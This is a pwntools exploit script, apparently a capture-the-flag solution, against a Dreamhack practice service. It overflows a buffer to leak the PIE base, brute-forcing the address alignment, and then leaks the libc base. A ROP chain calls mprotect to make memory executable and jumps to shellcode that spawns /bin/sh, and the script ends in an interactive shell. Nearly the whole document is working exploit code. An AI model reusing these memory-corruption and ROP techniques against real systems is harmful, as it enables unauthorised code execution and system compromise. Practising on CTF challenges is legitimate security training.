from pwn import *

context.arch = "amd64"
context.log_level = 'debug' 
elf = ELF("./deploy/prob")
libc = ELF("./deploy/libc.so.6")
libc_rop = ROP("./deploy/libc.so.6")

def pie_leak(p):
    p.sendlineafter(">>", b"1")
    p.recvuntil(b">>")
    p.send(b"a"*0x1000)
    p.sendlineafter(">>", b"1")
    p.recvuntil(b"a"*0x1000)
    pie_base = u64(p.recvline().replace(b"\n", b"").ljust(8, b"\x00")) - 0x2008
    print(hex(pie_base))
    return pie_base

for _ in range(0x1000):
    try:
        p = remote('host3.dreamhack.games', 23275)
    
        pie_base=pie_leak(p)
        #assume pie_base end with c000 so note_base last is ...0020
        if(pie_base & 0xf000 != 0xc000):
            continue
        note_base = pie_base + 0x4020
        p.sendlineafter(">>", b"1")
        p.sendlineafter(">>", b"2")

        p.sendafter(": ", bytes(str(0x28), 'utf-8')+ p64(pie_base + 0x4020)[2:]+ p64(pie_base + 0x156f)[:6])
        p.sendlineafter(": ", b"7")

        libc_base=u64(p.recvuntil(b"\x7f\n").replace(b"\n", b"")[-6:].ljust(8, b"\x00")) - libc.symbols['funlockfile']
        print(hex(libc_base))
        break
    except EOFError:
        p.close()
        continue

p.sendlineafter(b">>", b"1")

pop_rax = libc_base + 0x000d9ae2
add_rax_1 = libc_base + 0x000d83b0
pop_rdi = libc_base + libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_base + libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_r12 = libc_base + libc_rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
syscall = libc_base + 0x000ec0b9
call_rax = libc_base + 0x00145406

# rop를 세팅합니다
rop_payload = p64(pop_rdi) + p64(note_base-0x20) 
rop_payload += p64(pop_rsi) + p64(0x1000) 
rop_payload += p64(pop_rdx_r12) + p64(0x7) + p64(0x0)
rop_payload += p64(pop_rax) + p64(0xa-1)
rop_payload += p64(add_rax_1)
rop_payload += p64(syscall)
rop_payload += p64(pop_rax) + p64(note_base)
rop_payload += p64(call_rax)

# rop이후 이동할 쉘코드를 세팅합니다
payload = (asm('add rbp, 2') + b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05").ljust(0x100-0x20, b"\x90")
payload += (b"\x90"*0x3e + rop_payload).ljust(0x100, b"\x90")*0xc
payload.ljust(0x1000, b"\x00")

p.sendlineafter(">>", payload)

p.sendlineafter('>>', b'2')

p.sendafter(": ", bytes(str(0x28), 'utf-8'))
p.sendlineafter(": ", "0")


p.interactive()